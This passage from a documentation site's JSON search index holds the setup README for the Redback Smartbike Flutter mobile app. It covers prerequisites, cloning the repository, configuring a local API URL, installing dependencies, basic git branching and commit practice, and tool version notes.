","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Smartbike mobile app readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-readme#prerequisites","content":" Android Studio or Visual Studio CodeGitFlutter SDKDart  ","version":"Next","tagName":"h3"},{"title":"Installation Steps​","type":1,"pageTitle":"Smartbike mobile app readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-readme#installation-steps","content":" 1. Fork the Repository and Clone the Repository to your computer​  Open Android Studio:  Navigate to File -&gt; New -&gt; Project from Version Control.Enter the repository URL:https://github.com/Redback-Operations/redback-smartbike-mobile.gitChoose the directory to save the project on your computer.Click Clone.  2. Configure Environment Variables​  Add a .env file in the root project directory with the following content:  Base URL for API  API_URL_BASE = http://&lt;your_machine_network_address&gt;:8000  Example:  API_URL_BASE = http://192.168.3.103:8000  3. Install Dependencies​  Navigate to the pubspec.yaml file and run:  pub get This command will install all the necessary Flutter dependencies specified in pubspec.yaml.  4. Run the Backend​  Ensure that the backend server is running as the mobile app will need to communicate with it.  5. Start the App​  Using VS Code: Open lib/main.dart and press the run (play) button at the top right.Using Android Studio: Run the project directly from the IDE.  ","version":"Next","tagName":"h3"},{"title":"Version Control Best Practices​","type":1,"pageTitle":"Smartbike mobile app readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-readme#version-control-best-practices","content":" New Features and Fixes: Always create a new branch before starting work on a new feature or fix:  git checkout -b &lt;name-of-fix-or-feature&gt;   Commit Changes: Commit your changes frequently to maintain a good history and easier code reviews: bash  git add . git commit -m &quot;Describe the changes here&quot; git push # You might need to set the upstream branch if it's a new branch   Pull Changes: It's good practice to pull the latest changes from the repository before starting on new features:git pull  ","version":"Next","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Smartbike mobile app readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-readme#troubleshooting","content":" Merge Conflicts: If you encounter merge conflicts after pulling changes, consider saving your work in a separate file before attempting to resolve conflicts. This precaution helps avoid accidental data loss. IDE and SDK Compatibility: Ensure that your development environment matches the versions known to work with the app: IDE: Android Studio Iguana | 2023.2.1, Xcode Version 15.4 Flutter: 3.22.3 Stable Dart: 3.4.4 DevTools: 3.34.3  ","version":"Next","tagName":"h3"},{"title":"Happy Coding!​","type":1,"pageTitle":"Smartbike mobile app readme","url":"/redback-documentation/docs/web-mobile-app-dev/mobile-doc/smartbike-readme#happy-coding","content":" Remember, if in doubt about any steps or issues, contact your project leader for assistance. ","version":"Next","tagName":"h3"}],"options":{"id":"default"}}